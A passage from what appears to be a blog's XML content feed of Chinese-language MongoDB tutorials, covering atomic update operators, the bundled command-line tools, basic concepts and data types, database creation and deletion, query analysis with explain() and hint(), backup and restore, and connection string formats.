          language: &quot;English&quot;,
          publisher_id: &quot;oreilly&quot;,
          available: 3,
          checkout: [ &#123; by: &quot;joe&quot;, date: ISODate(&quot;2012-10-15&quot;) &#125; ]
        &#125;
</code></pre>
<p>你可以使用 db.collection.findAndModify()方法来判断书籍是否可结算并更新新的结算信息。</p>
<p>在同一个文档中嵌入的 available 和 checkout<br>字段来确保这些字段是同步更新的:</p>
<pre><code>db.books.findAndModify ( &#123;
   query: &#123;
            _id: 123456789,
            available: &#123; $gt: 0 &#125;
          &#125;,
   update: &#123;
             $inc: &#123; available: -1 &#125;,
             $push: &#123; checkout: &#123; by: &quot;abc&quot;, date: new Date() &#125; &#125;
           &#125;
&#125; )
</code></pre>
<h2 id="原子操作常用命令"><a href="#原子操作常用命令" class="headerlink" title="原子操作常用命令"></a>原子操作常用命令</h2><h4 id="set"><a href="#set" class="headerlink" title="$set"></a>$set</h4><p>用来指定一个键并更新键值，若键不存在并创建。</p>
<pre><code>&#123; $set : &#123; field : value &#125; &#125;
</code></pre>
<h4 id="unset"><a href="#unset" class="headerlink" title="$unset"></a>$unset</h4><p>用来删除一个键。</p>
<pre><code>&#123; $unset : &#123; field : 1&#125; &#125;
</code></pre>
<h4 id="inc"><a href="#inc" class="headerlink" title="$inc"></a>$inc</h4><p>$inc可以对文档的某个值为数字型（只能为满足要求的数字）的键进行增减的操作。</p>
<pre><code>&#123; $inc : &#123; field : value &#125; &#125;
</code></pre>
<h4 id="push"><a href="#push" class="headerlink" title="$push"></a>$push</h4><p>用法：</p>
<pre><code>&#123; $push : &#123; field : value &#125; &#125;
</code></pre>
<p>把value追加到field里面去，field一定要是数组类型才行，如果field不存在，会新增一个数组类型加进去。</p>
<h4 id="pushAll"><a href="#pushAll" class="headerlink" title="$pushAll"></a>$pushAll</h4><p>同$push,只是一次可以追加多个值到一个数组字段内。</p>
<pre><code>&#123; $pushAll : &#123; field : value_array &#125; &#125;
</code></pre>
<h4 id="pull"><a href="#pull" class="headerlink" title="$pull"></a>$pull</h4><p>从数组field内删除一个等于value值。</p>
<pre><code>&#123; $pull : &#123; field : _value &#125; &#125;
</code></pre>
<h4 id="addToSet"><a href="#addToSet" class="headerlink" title="$addToSet"></a>$addToSet</h4><p>增加一个值到数组内，而且只有当这个值不在数组内才增加。</p>
<h4 id="pop"><a href="#pop" class="headerlink" title="$pop"></a>$pop</h4><p>删除数组的第一个或最后一个元素</p>
<pre><code>&#123; $pop : &#123; field : 1 &#125; &#125;
</code></pre>
<h4 id="rename"><a href="#rename" class="headerlink" title="$rename"></a>$rename</h4><p>修改字段名称</p>
<pre><code>&#123; $rename : &#123; old_field_name : new_field_name &#125; &#125;
</code></pre>
<h4 id="bit"><a href="#bit" class="headerlink" title="$bit"></a>$bit</h4><p>位操作，integer类型</p>
<pre><code>&#123;$bit : &#123; field : &#123;and : 5&#125;&#125;&#125;
</code></pre>
<h4 id="偏移操作符"><a href="#偏移操作符" class="headerlink" title="偏移操作符"></a>偏移操作符</h4><pre><code>&gt; t.find() &#123; &quot;_id&quot; : ObjectId(&quot;4b97e62bf1d8c7152c9ccb74&quot;), &quot;title&quot; : &quot;ABC&quot;, &quot;comments&quot; : [ &#123; &quot;by&quot; : &quot;joe&quot;, &quot;votes&quot; : 3 &#125;, &#123; &quot;by&quot; : &quot;jane&quot;, &quot;votes&quot; : 7 &#125; ] &#125;
 
&gt; t.update( &#123;&#39;comments.by&#39;:&#39;joe&#39;&#125;, &#123;$inc:&#123;&#39;comments.$.votes&#39;:1&#125;&#125;, false, true )
 
&gt; t.find() &#123; &quot;_id&quot; : ObjectId(&quot;4b97e62bf1d8c7152c9ccb74&quot;), &quot;title&quot; : &quot;ABC&quot;, &quot;comments&quot; : [ &#123; &quot;by&quot; : &quot;joe&quot;, &quot;votes&quot; : 4 &#125;, &#123; &quot;by&quot; : &quot;jane&quot;, &quot;votes&quot; : 7 &#125; ] &#125;
</code></pre>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB命令</title>
    <url>/blog/nosql/mongodb/bin/</url>
    <content><![CDATA[<p>MongoDB安装后主要是一些可执行文件，每个文件都可完成一定的功能。</p>
<p>bsondump.exe</p>
<p><strong>mongo.exe</strong></p>
<p>启动客户端连接，可以执行各种数据库操作。</p>
<p><strong>mongod.exe</strong></p>
<p>启动数据库</p>
<pre><code>mongod.exe --dbpath data\db --rest
</code></pre>
<p><strong>mongodump.exe</strong></p>
<p>用于从mongodb数据库中导出BSON格式的文件，类似于mysql的dump工具mysqldump</p>
<pre><code>mongod.exe --dbpath data\db --rest
</code></pre>
<p><strong>mongoexport.exe</strong></p>
<p>用于将mongodb中的数据库，导出为JSON,CSV或TSV的格式。使用示例：</p>
<pre><code>mongoexport --host mongodb1.example.net --port 37017 --username user --password pass --collection contacts
</code></pre>
<p><strong>mongofiles.exe</strong></p>
<p>用于和mongoDB的GridFS文件系统交互的命令，并可操作其中的文件，它提供了我们本地系统与GridFS文件系统之间的存储对象接口。使用示例：</p>
<pre><code>mongofiles --hostname db1.example.net --port 37017 -d records list
</code></pre>
<p><strong>mongoimport.exe</strong></p>
<p>用于将JSON,CSV或TSV等文件格式，导入到mongoDB数据库中，使用示例：</p>
<pre><code>mongoimport --db users --collection contacts --type csv --file /opt/backups/contacts.csv
</code></pre>
<p><strong>mongooplog.exe</strong></p>
<p> 用于从运行的mongod服务中拷贝运行日志到指定的服务器，主要用于增量备份，使用示例：</p>
<pre><code> mongooplog --from mongodb0.example.net --host mongodb1.example.net
</code></pre>
<p><strong>mongoperf.exe</strong></p>
<p>用于独立检查mongoDB的I&#x2F;O性能的工具，使用示例：</p>
<pre><code>mongoperf.exe &lt; testPrefJson.txt
</code></pre>
<p>注：testPrefJson.txt存放测试的参数，以json格式，如：{nThreads:16,fileSizeMB:1000,r:true}，更多参数参看该命令的帮助，在linux上配置iostat命令观察写入的效果</p>
<p><strong>mongorestore.exe</strong></p>
<p>用于恢复导出的BSON文件到mongodb数据库中</p>
<p><strong>mongos.exe</strong></p>
<p>用于注册系统</p>
<p><strong>mongostat.exe</strong></p>
<p>当前mongod状态监控工具，像linux中监控linux的vmstat</p>
<p><strong>mongotop.exe</strong></p>
<p>提供了一个跟踪mongod数据库花费在读写数据的时间，为每个collection都会记录，默认记录时间是按秒记录。</p>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB  概念解析</title>
    <url>/blog/nosql/mongodb/base/</url>
    <content><![CDATA[<p>不管我们学习什么数据库都应该学习其中的基础概念，在mongodb中基本的概念是文档、集合、数据库，下面我们挨个介绍。</p>
<p>下表将帮助您更容易理解Mongo中的一些概念：</p>
<table>
<thead>
<tr>
<th>SQL术语&#x2F;概念</th>
<th>MongoDB术语&#x2F;概念</th>
<th>解释&#x2F;说明</th>
</tr>
</thead>
<tbody><tr>
<td>database</td>
<td>database</td>
<td>数据库</td>
</tr>
<tr>
<td>table</td>
<td>collection</td>
<td>数据库表&#x2F;集合</td>
</tr>
<tr>
<td>row</td>
<td>document</td>
<td>数据记录行&#x2F;文档</td>
</tr>
<tr>
<td>column</td>
<td>field</td>
<td>数据字段&#x2F;域</td>
</tr>
<tr>
<td>index</td>
<td>index</td>
<td>索引</td>
</tr>
<tr>
<td>table joins</td>
<td>?</td>
<td>表连接,MongoDB不支持</td>
</tr>
<tr>
<td>primary key</td>
<td>primary key</td>
<td>主键,MongoDB自动将_id字段设置为主键</td>
</tr>
</tbody></table>
<p>通过下图实例，我们也可以更直观的的了解Mongo中的一些概念：</p>
<p><img src="/images/mongodb/tablecollection.png"></p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>一个mongodb中可以建立多个数据库。</p>
<p>MongoDB的默认数据库为”db”，该数据库存储在data目录中。</p>
<p>MongoDB的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。</p>
<p><strong>“show dbs”</strong> 命令可以显示所有数据的列表。</p>
<pre><code>$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; show dbs
local  0.078GB
test   0.078GB
&gt; 
</code></pre>
<p>执行 <strong>“db”</strong> 命令可以显示当前数据库对象或集合。</p>
<pre><code>$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; db
test
&gt; 
</code></pre>
<p>运行”use”命令，可以连接到一个指定的数据库。</p>
<pre><code>&gt; use local
switched to db local
&gt; db
local
&gt; 
</code></pre>
<p>以上实例命令中，”local” 是你要链接的数据库。</p>
<p>在下一个章节我们将详细讲解MongoDB中命令的使用。</p>
<p>数据库也通过名字来标识。数据库名可以是满足以下条件的任意UTF-8字符串。</p>
<ul>
<li>不能是空字符串（””)。</li>
<li>不得含有’ ‘（空格)、.、$、&#x2F;、\和\0 (空宇符)。</li>
<li>应全部小写。</li>
<li>最多64字节。</li>
</ul>
<p>有一些数据库名是保留的，可以直接访问这些有特殊作用的数据库。</p>
<ul>
<li><strong>admin</strong>：从权限的角度来看，这是”root”数据库。要是将一个用户添加到这个数据库，这个用户自动继承所有数据库的权限。一些特定的服务器端命令也只能从这个数据库运行，比如列出所有的数据库或者关闭服务器。</li>
<li>**local:**这个数据永远不会被复制，可以用来存储限于本地单台服务器的任意集合</li>
<li><strong>config</strong>:当Mongo用于分片设置时，config数据库在内部使用，用于保存分片的相关信息。</li>
</ul>
<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>文档是一个键值(key-value)对(即BSON)。MongoDB的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是MongoDB 非常突出的特点。</p>
<p>一个简单的文档例子如下：</p>
<pre><code>&#123;&quot;site&quot;:&quot;www.runoob.com&quot;, &quot;name&quot;:&quot;菜鸟教程&quot;&#125;
</code></pre>
<p>下表列出了 RDBMS 与 MongoDB 对应的术语：</p>
<table><tbody><tr><th style="width:50%;">RDBMS</th><th>MongoDB</th></tr><tr><td>数据库</td><td>数据库</td></tr><tr><td>表格</td><td>集合</td></tr><tr><td>行</td><td>文档</td></tr><tr><td>列</td><td>字段</td></tr><tr><td>表联合</td><td>嵌入文档</td></tr><tr><td>主键</td><td>主键 (MongoDB 提供了 key  为 _id )</td></tr><tr><th colspan="2" style="text-align:center;">数据库服务和客户端</th></tr><tr><td>Mysqld/Oracle</td><td>mongod</td></tr><tr><td>mysql/sqlplus</td><td>mongo</td></tr></tbody></table>
需要注意的是：

<ol>
<li>文档中的键&#x2F;值对是有序的。</li>
<li>文档中的值不仅可以是在双引号里面的字符串，还可以是其他几种数据类型（甚至可以是整个嵌入的文档)。</li>
<li>MongoDB区分类型和大小写。</li>
<li>MongoDB的文档不能有重复的键。</li>
<li>文档的键是字符串。除了少数例外情况，键可以使用任意UTF-8字符。</li>
</ol>
<p>文档键命名规范：</p>
<ul>
<li>键不能含有\0 (空字符)。这个字符用来表示键的结尾。</li>
<li>.和$有特别的意义，只有在特定环境下才能使用。</li>
<li>以下划线”_“开头的键是保留的(不是严格要求的)。</li>
</ul>
<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>集合就是 MongoDB 文档组，类似于 RDBMS （关系数据库管理系统：Relational Database Management System)中的表格。</p>
<p>集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据，但通常情况下我们插入集合的数据都会有一定的关联性。</p>
<p>比如，我们可以将以下不同数据结构的文档插入到集合中：</p>
<pre><code>&#123;&quot;site&quot;:&quot;www.baidu.com&quot;&#125;
&#123;&quot;site&quot;:&quot;www.google.com&quot;,&quot;name&quot;:&quot;Google&quot;&#125;
&#123;&quot;site&quot;:&quot;www.runoob.com&quot;,&quot;name&quot;:&quot;菜鸟教程&quot;,&quot;num&quot;:5&#125;
</code></pre>
<p>当第一个文档插入时，集合就会被创建。</p>
<h3 id="合法的集合名"><a href="#合法的集合名" class="headerlink" title="合法的集合名"></a>合法的集合名</h3><ul>
<li>集合名不能是空字符串””。</li>
<li>集合名不能含有\0字符（空字符)，这个字符表示集合名的结尾。</li>
<li>集合名不能以”system.”开头，这是为系统集合保留的前缀。</li>
<li>用户创建的集合名字不能含有保留字符。有些驱动程序的确支持在集合名里面包含，这是因为某些系统生成的集合中包含该字符。除非你要访问这种系统创建的集合，否则千万不要在名字里出现$。</li>
</ul>
<p>　</p>
<p>如下实例：</p>
<pre><code>db.col.findOne()
</code></pre>
<h3 id="capped-collections"><a href="#capped-collections" class="headerlink" title="capped collections"></a>capped collections</h3><p>Capped collections 就是固定大小的collection。</p>
<p>它有很高的性能以及队列过期的特性(过期按照插入的顺序). 有点和 “RRD”概念类似。</p>
<p>Capped collections是高性能自动的维护对象的插入顺序。它非常适合类似记录日志的功能和标准的collection不同，你必须要显式的创建一个capped collection，指定一个collection的大小，单位是字节。collection的数据存储空间值提前分配的。</p>
<p>要注意的是指定的存储大小包含了数据库的头信息。</p>
<pre><code>db.createCollection(&quot;mycoll&quot;, &#123;capped:true, size:100000&#125;)
</code></pre>
<ul>
<li>在capped collection中，你能添加新的对象。</li>
<li>能进行更新，然而，对象不会增加存储空间。如果增加，更新就会失败 。</li>
<li>数据库不允许进行删除。使用drop()方法删除collection所有的行。</li>
<li>注意: 删除之后，你必须显式的重新创建这个collection。</li>
<li>在32bit机器中，capped collection最大存储为1e9( 1X109)个字节。</li>
</ul>
<h2 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h2><p>数据库的信息是存储在集合中。它们使用了系统的命名空间：</p>
<pre><code>dbname.system.*
</code></pre>
<p>在MongoDB数据库中名字空间 .system.*是包含多种系统信息的特殊集合(Collection)，如下:</p>
<p>|集合命名空间              | 描述<br>|————————-|- ——————————————-<br>|dbname.system.namespaces |  列出所有名字空间。<br>|dbname.system.indexes    |  列出所有索引。<br>|dbname.system.profile    |  包含数据库概要(profile)信息。<br>|dbname.system.users      |  列出所有可访问数据库的用户。<br>|dbname.local.sources     |  包含复制对端（slave）的服务器信息和状态。</p>
<p>对于修改系统集合中的对象有如下限制。</p>
<p>在插入数据，可以创建索引。但除此之外该表信息是不可变的(特殊的drop index命令将自动更新相关信息)。</p>
是可修改的。 是可删除的。

<h2 id="MongoDB-数据类型"><a href="#MongoDB-数据类型" class="headerlink" title="MongoDB 数据类型"></a>MongoDB 数据类型</h2><p>下表为MongoDB中常用的几种数据类型。</p>
<p>  |数据类型            |描述                                                                                                       |<br>  |——————–|—|-<br>  |String              |字符串。存储数据常用的数据类型。在 MongoDB 中，UTF-8 编码的字符串才是合法的。|<br>  |Integer             |整型数值。用于存储数值。根据你所采用的服务器，可分为 32 位或 64 位。|<br>  |Boolean             |布尔值。用于存储布尔值（真&#x2F;假）。|<br>  |Double              |双精度浮点值。用于存储浮点值。|<br>  |Min&#x2F;Max keys        |将一个值与 BSON（二进制的 JSON）元素的最低值和最高值相对比。|<br>  |Arrays              |用于将数组或列表或多个值存储为一个键。|<br>  |Timestamp           |时间戳。记录文档修改或添加的具体时间。|<br>  |Object              |用于内嵌文档。|<br>  |Null                |用于创建空值。|<br>  |Symbol              |符号。该数据类型基本上等同于字符串类型，但不同的是，它一般用于采用特殊符号类型的语言。                     |<br>  |Date                |日期时间。用 UNIX 时间格式来存储当前日期或时间。你可以指定自己的日期时间：创建 Date 对象，传入年月日信息。 |<br>  |Object ID           |对象 ID。用于创建文档的 ID。|<br>  |Binary Data         |二进制数据。用于存储二进制数据。|<br>  |Code                |代码类型。用于在文档中存储 JavaScript 代码。|<br>  |Regular expression  |正则表达式类型。用于存储正则表达式。|</p>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 创建删除数据库</title>
    <url>/blog/nosql/mongodb/createdropdb/</url>
    <content><![CDATA[<h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>MongoDB 创建数据库的语法格式如下：</p>
<pre><code>use DATABASE_NAME
</code></pre>
<p>如果数据库不存在，则创建数据库，否则切换到指定数据库。</p>
<h2 id="当前数据库连接"><a href="#当前数据库连接" class="headerlink" title="当前数据库连接"></a>当前数据库连接</h2><p>当前数据库连接为全局变量db，可以通过db操作集合和文档。</p>
<p>MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在test 数据库中。</p>
<h2 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h2><p>如果你想查看所有数据库，可以使用 show dbs 命令：</p>
<pre><code>&gt; show dbs
local  0.078GB
test   0.078GB
&gt; 
</code></pre>
<p>刚创建的数据库并不在数据库的列表中，<br>要显示它，我们需要向数据库插入一些数据。</p>
<pre><code>&gt; db.iteedu.insert(&#123;&quot;name&quot;:&quot;iteedu&quot;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; show dbs
local   0.000GB
iteedu  0.000GB
test    0.000GB
&gt; 
</code></pre>
<h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><p>MongoDB 删除数据库的语法格式如下：</p>
<pre><code>db.dropDatabase()
</code></pre>
<p>删除当前数据库，默认为 test，你可以使用 db 命令查看当前数据库名。</p>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 查询分析explain()</title>
    <url>/blog/nosql/mongodb/explain/</url>
    <content><![CDATA[<p>MongoDB<br>查询分析可以确保我们建议的索引是否有效，是查询语句性能分析的重要工具。</p>
<p>MongoDB 查询分析常用函数有：explain() 和 hint()。</p>
<h2 id="使用-explain"><a href="#使用-explain" class="headerlink" title="使用 explain()"></a>使用 explain()</h2><p>explain操作提供了查询信息，使用索引及查询统计等。有利于我们对索引的优化。</p>
<p>接下来我们在 users 集合中创建 gender 和 user_name 的索引：</p>
<pre><code>db.users.ensureIndex(&#123;gender:1,user_name:1&#125;)
db.users.find(&#123;gender:&quot;M&quot;&#125;,&#123;user_name:1,_id:0&#125;).explain()
</code></pre>
<p>以上的 explain() 查询返回如下结果：</p>
<pre><code>&#123;
   &quot;cursor&quot; : &quot;BtreeCursor gender_1_user_name_1&quot;,
   &quot;isMultiKey&quot; : false,
   &quot;n&quot; : 1,
   &quot;nscannedObjects&quot; : 0,
   &quot;nscanned&quot; : 1,
   &quot;nscannedObjectsAllPlans&quot; : 0,
   &quot;nscannedAllPlans&quot; : 1,
   &quot;scanAndOrder&quot; : false,
   &quot;indexOnly&quot; : true,
   &quot;nYields&quot; : 0,
   &quot;nChunkSkips&quot; : 0,
   &quot;millis&quot; : 0,
   &quot;indexBounds&quot; : &#123;
      &quot;gender&quot; : [
         [
            &quot;M&quot;,
            &quot;M&quot;
         ]
      ],
      &quot;user_name&quot; : [
         [
            &#123;
               &quot;$minElement&quot; : 1
            &#125;,
            &#123;
               &quot;$maxElement&quot; : 1
            &#125;
         ]
      ]
   &#125;
&#125;
</code></pre>
<p>现在，我们看看这个结果集的字段：</p>
<ul>
<li><strong>indexOnly</strong>: 字段为 true ，表示我们使用了索引。</li>
<li><strong>cursor</strong>：因为这个查询使用了索引，MongoDB中索引存储在B树结构中，所以这是也使用了BtreeCursor类型的游标。如果没有使用索引，游标的类型是BasicCursor。这个键还会给出你所使用的索引的名称，你通过这个名称可以查看当前数据库下的system.indexes集合（系统自动创建，由于存储索引信息，这个稍微会提到）来得到索引的详细信息。</li>
<li><strong>n</strong>：当前查询返回的文档数量。</li>
<li><strong>nscanned&#x2F;nscannedObjects</strong>：表明当前这次查询一共扫描了集合中多少个文档，我们的目的是，让这个数值和返回文档的数量越接近越好。</li>
<li><strong>millis</strong>：当前查询所需时间，毫秒数。</li>
<li><strong>indexBounds</strong>：当前查询具体使用的索引。</li>
</ul>
<h2 id="使用-hint"><a href="#使用-hint" class="headerlink" title="使用 hint()"></a>使用 hint()</h2><p>虽然MongoDB查询优化器一般工作的很不错，但是也可以使用hints来强迫MongoDB使用一个指定的索引。</p>
<p>这种方法某些情形下会提升性能。</p>
<p>一个有索引的collection并且执行一个多字段的查询(一些字段已经索引了)。</p>
<p>如下查询实例指定了使用 gender 和 user_name 索引字段来查询：</p>
<pre><code>&gt;db.users.find(&#123;gender:&quot;M&quot;&#125;,&#123;user_name:1,_id:0&#125;).hint(&#123;gender:1,user_name:1&#125;)
</code></pre>
<p>可以使用 explain() 函数来分析以上查询：</p>
<pre><code>&gt;db.users.find(&#123;gender:&quot;M&quot;&#125;,&#123;user_name:1,_id:0&#125;).hint(&#123;gender:1,user_name:1&#125;).explain()
</code></pre>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 备份与恢复</title>
    <url>/blog/nosql/mongodb/dump/</url>
    <content><![CDATA[<p>在Mongodb中我们使用mongodump命令来备份MongoDB数据。该命令可以导出所有数据到指定目录中。</p>
<p>mongodump命令可以通过参数指定导出的数据量级转存的服务器。</p>
<p>mongodump命令脚本语法如下：</p>
<pre><code>&gt;mongodump -h dbhost -d dbname -o dbdirectory
</code></pre>
<ul>
<li><p><strong>-h：</strong></p>
<p>MongDB所在服务器地址，例如：127.0.0.1，当然也可以指定端口号：127.0.0.1:27017</p>
</li>
<li><p><strong>-d：</strong></p>
<p>需要备份的数据库实例，例如：test</p>
</li>
<li><p><strong>-o：</strong></p>
<p>备份的数据存放位置，例如：c:\data\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。</p>
</li>
</ul>
<p>在本地使用 27017<br>启动你的mongod服务。打开命令提示符窗口，进入MongoDB安装目录的bin目录输入命令mongodump:</p>
<pre><code>&gt;mongodump
</code></pre>
<p>执行以上命令后，客户端会连接到ip为 127.0.0.1 端口号为 27017<br>的MongoDB服务上，并备份所有数据到 bin&#x2F;dump&#x2F; 目录中。</p>
<p>mongodb使用 mongorerstore 命令来恢复备份的数据。</p>
<p>mongorestore命令脚本语法如下：</p>
<pre><code>&gt;mongorestore -h dbhost -d dbname --directoryperdb dbdirectory
</code></pre>
<ul>
<li><p><strong>-h：</strong></p>
<p>MongoDB所在服务器地址</p>
</li>
<li><p><strong>-d：</strong></p>
<p>需要恢复的数据库实例，例如：test，当然这个名称也可以和备份时候的不一样，比如test2</p>
</li>
<li><p><strong>–directoryperdb：</strong></p>
<p>备份数据所在位置，例如：c:\data\dump\test，这里为什么要多加一个test，而不是备份时候的dump，读者自己查看提示吧！</p>
</li>
<li><p><strong>–drop：</strong></p>
<p>恢复的时候，先删除当前数据，然后恢复备份的数据。就是说，恢复后，备份后添加修改的数据都会被删除，慎用哦！</p>
</li>
</ul>
]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB 连接</title>
    <url>/blog/nosql/mongodb/connection/</url>
    <content><![CDATA[<p>在本教程我们将讨论 MongoDB 的不同连接方式。</p>
<h2 id="启动-MongoDB服务"><a href="#启动-MongoDB服务" class="headerlink" title="启动 MongoDB服务"></a>启动 MongoDB服务</h2><p>在前面的教程中，我们已经讨论<a href="/mongodb/mongodb-window-install.html">了如何启动MongoDB服</a>务，你只需要在MongoDB安装目录的bin目录下执行’mongod’即可。</p>
<p>执行启动操作后，mongodb在输出一些必要信息后不会输出任何信息，之后就等待连接的建立，当连接被建立后，就会开始打印日志信息。</p>
<p>你可以使用 MongoDB shell 来连接 MongoDB 服务器。你也可以使用 PHP 来连接MongoDB。本教程我们会使用 MongoDB shell 来连接 Mongodb服务，之后的章节我们将会介绍如何通过php 来连接MongoDB服务。</p>
<h2 id="通过shell连接MongoDB服务"><a href="#通过shell连接MongoDB服务" class="headerlink" title="通过shell连接MongoDB服务"></a>通过shell连接MongoDB服务</h2><p>你可以通过执行以下命令来连接MongoDB的服务。</p>
<p><strong>注意：</strong>localhost为主机名，这个选项是必须的：</p>
<pre><code>mongodb://localhost
</code></pre>
<p>当你执行以上命令时，你可以看到以下输出结果：</p>
<pre><code>$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; mongodb://localhostmongodb://localhost
... 
</code></pre>
<p>这时候你返回查看运行 <strong>.&#x2F;mongod</strong>命令的窗口，可以看到是从哪里连接到MongoDB的服务器，您可以看到如下信息：</p>
<pre><code>……省略信息……
2015-09-25T17:22:27.336+0800 I CONTROL  [initandlisten] allocator: tcmalloc
2015-09-25T17:22:27.336+0800 I CONTROL  [initandlisten] options: &#123; storage: &#123; dbPath: &quot;/data/db&quot; &#125; &#125;
2015-09-25T17:22:27.350+0800 I NETWORK  [initandlisten] waiting for connections on port 27017
2015-09-25T17:22:36.012+0800 I NETWORK  [initandlisten] connection accepted from 127.0.0.1:37310 #1 (1 connection now open)  # 该行表明一个来自本机的连接

……省略信息……
</code></pre>
<h2 id="MongoDB连接命令格式"><a href="#MongoDB连接命令格式" class="headerlink" title="MongoDB连接命令格式"></a>MongoDB连接命令格式</h2><p>使用用户名和密码连接到MongoDB服务器，你必须使用’<strong>username:password@hostname&#x2F;dbname</strong>‘格式，’username’为用户名，’password’ 为密码。</p>
<p>使用用户名和密码连接登陆到默认数据库：</p>
<pre><code>$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
mongodb://admin:123456@localhost/
</code></pre>
<p>以上命令中，用户 admin 使用密码 123456 连接到本地的 MongoDB服务上。输出结果如下所示：</p>
<pre><code>&gt; mongodb://admin:123456@localhost/
... 
</code></pre>
<p>使用用户名和密码连接登陆到指定数据库：</p>
<p>连接到指定数据库的格式如下：</p>
<pre><code>mongodb://admin:123456@localhost/test
</code></pre>
<h2 id="更多连接实例"><a href="#更多连接实例" class="headerlink" title="更多连接实例"></a>更多连接实例</h2><p>连接本地数据库服务器，端口是默认的。</p>
<pre><code>mongodb://localhost
</code></pre>
<p>使用用户名fred，密码foobar登录localhost的admin数据库。</p>
<pre><code>mongodb://fred:foobar@localhost
</code></pre>
<p>使用用户名fred，密码foobar登录localhost的baz数据库。</p>
<pre><code>mongodb://fred:foobar@localhost/baz
</code></pre>
<p>连接 replica pair, 服务器1为example1.com服务器2为example2。</p>
<pre><code>mongodb://example1.com:27017,example2.com:27017
</code></pre>
<p>连接 replica set 三台服务器 (端口 27017, 27018, 和27019):</p>
<pre><code>mongodb://localhost,localhost:27018,localhost:27019
</code></pre>
<p>连接 replica set 三台服务器, 写入操作应用在主服务器<br>并且分布查询到从服务器。</p>
<pre><code>mongodb://host1,host2,host3/?slaveOk=true
</code></pre>
<p>直接连接第一个服务器，无论是replica set一部分或者主服务器或者从服务器。</p>
<pre><code>mongodb://host1,host2,host3/?connect=direct;slaveOk=true
</code></pre>
<p>当你的连接服务器有优先级，还需要列出所有服务器，你可以使用上述连接方式。</p>
<p>安全模式连接到localhost:</p>
<pre><code>mongodb://localhost/?safe=true
</code></pre>
<p>以安全模式连接到replica<br>set，并且等待至少两个复制服务器成功写入，超时时间设置为2秒。</p>
<pre><code>mongodb://host1,host2,host3/?safe=true;w=2;wtimeoutMS=2000
</code></pre>
<h2 id="参数选项说明"><a href="#参数选项说明" class="headerlink" title="参数选项说明"></a>参数选项说明</h2><p>标准格式：</p>
<pre><code>mongodb://\[username:password@\]host1\[:port1\]\[,host2\[:port2\],...\[,hostN\[:portN\]\]\]\[/\[database\]\[?options\]\]
</code></pre>
<p>标准的连接格式包含了多个选项(options)，如下所示：</p>
<table><tbody><tr><th>选项</th><th>描述</th></tr><tr><td>replicaSet=name</td><td>验证replica set的名称。 Impliesconnect=replicaSet.</td></tr><tr><td>slaveOk=true|false</td><td><ul><li>true:在connect=direct模式下，驱动会连接第一台机器，即使这台服务器不是主。在connect=replicaSet模式下，驱动会发送所有的写请求到主并且把读取操作分布在其他从服务器。</li><li>false: 在 connect=direct模式下，驱动会自动找寻主服务器. 在connect=replicaSet 模式下，驱动仅仅连接主服务器，并且所有的读写命令都连接到主服务器。</li></ul></td></tr><tr><td>safe=true|false</td><td><ul><li>true: 在执行更新操作之后，驱动都会发送getLastError命令来确保更新成功。(还要参考 wtimeoutMS).</li><li>false: 在每次更新之后，驱动不会发送getLastError来确保更新成功。</li></ul></td></tr><tr><td>w=n</td><td>驱动添加 { w : n } 到getLastError命令. 应用于safe=true。</td></tr><tr><td>wtimeoutMS=ms</td><td>驱动添加 { wtimeout : ms } 到 getlasterror 命令. 应用于 safe=true.</td></tr><tr><td>fsync=true|false</td><td><ul><li>true: 驱动添加 { fsync : true } 到 getlasterror 命令.应用于 safe=true.</li><li>false: 驱动不会添加到getLastError命令中。</li></ul></td></tr><tr><td>journal=true|false</td><td>如果设置为 true, 同步到 journal (在提交到数据库前写入到实体中). 应用于 safe=true</td></tr><tr><td>connectTimeoutMS=ms</td><td>可以打开连接的时间。</td></tr><tr><td>socketTimeoutMS=ms</td><td>发送和接受sockets的时间。</td></tr></tbody></table>]]></content>
      <categories>
        <category>nosql</category>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>nosql</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB GridFS</title>
    <url>/blog/nosql/mongodb/gridfs/</url>
